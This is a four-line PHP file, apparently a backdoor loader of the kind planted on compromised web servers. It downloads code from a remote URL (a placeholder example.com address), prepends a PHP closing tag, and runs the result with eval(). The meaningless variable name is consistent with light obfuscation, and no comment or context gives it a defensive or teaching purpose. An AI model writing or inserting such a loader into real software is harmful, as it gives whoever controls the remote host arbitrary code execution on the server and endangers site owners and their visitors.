<?php
$rxtql = file_get_contents('https://example.com/file.php');
$rxtql = "?> ".$rxtql;
eval($rxtql);
